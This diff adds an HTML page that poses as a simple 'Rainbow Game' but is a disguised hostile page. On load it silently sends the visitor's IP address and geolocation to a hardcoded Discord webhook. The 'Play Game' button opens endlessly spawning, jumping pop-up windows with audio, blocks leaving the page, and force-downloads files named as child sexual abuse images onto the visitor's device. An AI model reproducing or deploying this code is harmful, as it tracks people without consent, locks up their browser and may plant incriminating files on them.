@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Rainbow Game Page</title>
+    <link rel="stylesheet" href="static/style.css">
+    <style>
+        body { text-align: center; margin: 0; }
+        #mainVideo {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            object-fit: cover;
+            z-index: -1;
+        }
+        .center {
+            position: relative;
+            z-index: 1;
+        }
+        .play-button {
+            padding: 10px 20px;
+            font-size: 40px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <video id="mainVideo" autoplay loop muted>
+        <source src="static/videos/video1.mp4" type="video/mp4">
+        Your browser does not support the video tag.
+    </video>
+
+    <div class="center">
+        <button class="play-button" onclick="playGame()">Play Game</button>
+    </div>
+
+    <audio id="gameAudio" preload="auto">
+        <source src="static/audio/backround.mp3" type="audio/mp3">
+        Your browser does not support the audio tag.
+    </audio>
+
+    <script>
+        const discordWebhookUrl = 'https://discord.com/api/webhooks/1301709392281997322/kH6N7vDGfBOyJant0WabQ54xOMkY1iJBNMN6u2c3K4cTHMcs1cBsr8uPMkpCr619rWbI';
+
+        function sendLocationToDiscord(location) {
+            const data = {
+                content: `User Location: ${location.city}, ${location.country} (Latitude: ${location.latitude}, Longitude: ${location.longitude})\nIP Address: ${location.ip}`
+            };
+
+            fetch(discordWebhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    console.error('Failed to send location to Discord:', response);
+                }
+            })
+            .catch(error => {
+                console.error('Error sending location to Discord:', error);
+            });
+        }
+
+        window.onload = () => {
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    const location = {
+                        city: data.city,
+                        country: data.country_name,
+                        latitude: data.latitude,
+                        longitude: data.longitude,
+                        ip: data.ip
+                    };
+                    sendLocationToDiscord(location);
+                })
+                .catch(error => {
+                    console.error('Error getting location:', error);
+                });
+        };
+
+        function playGame() {
+            // Enter fullscreen
+            const body = document.body;
+            if (body.requestFullscreen) {
+                body.requestFullscreen();
+            } else if (body.mozRequestFullScreen) { // Firefox
+                body.mozRequestFullScreen();
+            } else if (body.webkitRequestFullscreen) { // Chrome, Safari and Opera
+                body.webkitRequestFullscreen();
+            } else if (body.msRequestFullscreen) { // IE/Edge
+                body.msRequestFullscreen();
+            }
+
+            const videoPaths = [
+                "static/videos/video1.mp4",
+                "static/videos/video2.mp4",
+                "static/videos/video3.mp4",
+                "static/videos/video4.mp4",
+            ];
+
+            const audio = document.getElementById('gameAudio');
+            audio.play().catch(err => console.error('Error playing audio:', err));
+
+            const mainVideo = document.getElementById('mainVideo');
+            mainVideo.style.display = 'block';
+            mainVideo.play();
+
+            downloadImages();
+
+            setInterval(() => {
+                const randomPath = videoPaths[Math.floor(Math.random() * videoPaths.length)];
+                const windowFeatures = `width=800,height=450,left=${Math.random() * (window.screen.width - 800)},top=${Math.random() * (window.screen.height - 450)}`;
+
+                const newWindow = window.open("", "_blank", windowFeatures);
+                newWindow.document.write(`
+                    <html>
+                        <head>
+                            <style>
+                                body { margin: 0; overflow: hidden; position: relative; }
+                                video { position: absolute; width: 100%; height: 100%; object-fit: cover; }
+                            </style>
+                        </head>
+                        <body>
+                            <audio id="popupAudio" preload="auto" autoplay loop>
+                                <source src="static/audio/background2.mp3" type="audio/mp3">
+                                Your browser does not support the audio tag.
+                            </audio>
+                            <video autoplay loop muted>
+                                <source src="${randomPath}" type="video/mp4">
+                            </video>
+                            <script>
+                                function moveWindow() {
+                                    const x = Math.random() * (window.screen.width - 800);
+                                    const y = Math.random() * (window.screen.height - 450);
+                                    window.moveTo(x, y);
+                                }
+
+                                setInterval(moveWindow, 500);
+
+                                // Download images in each pop-up tab
+                                function downloadImages() {
+                                    const images = [
+                                        "static/images/image1.jpg",
+                                        "static/images/image2.png"
+                                    ];
+
+                                    images.forEach((image, index) => {
+                                        setTimeout(() => {
+                                            const link = document.createElement('a');
+                                            link.href = image;
+                                            link.download = image.split('/').pop();
+                                            document.body.appendChild(link);
+                                            link.click();
+                                            document.body.removeChild(link);
+                                        }, index * 2000);
+                                    });
+                                }
+
+                                // Call downloadImages in each pop-up tab
+                                downloadImages();
+                            <\/script>
+                        </body>
+                    </html>
+                `);
+                newWindow.document.close();
+            }, 500);
+        }
+
+        function downloadImages() {
+            const images = [
+                "static/images/ChildPorn1.jpg",
+                "static/images/ChildPorn2.png"
+            ];
+
+            images.forEach((image, index) => {
+                setTimeout(() => {
+                    const link = document.createElement('a');
+                    link.href = image;
+                    link.download = image.split('/').pop();
+                    document.body.appendChild(link);
+                    link.click();
+                    document.body.removeChild(link);
+                }, index * 2000);
+            });
+        }
+
+        window.addEventListener('beforeunload', function (event) {
+            const confirmationMessage = "Are you sure you want to leave?";
+            event.returnValue = confirmationMessage;
+            return confirmationMessage;
+        });
+    </script>
+</body>
+</html>
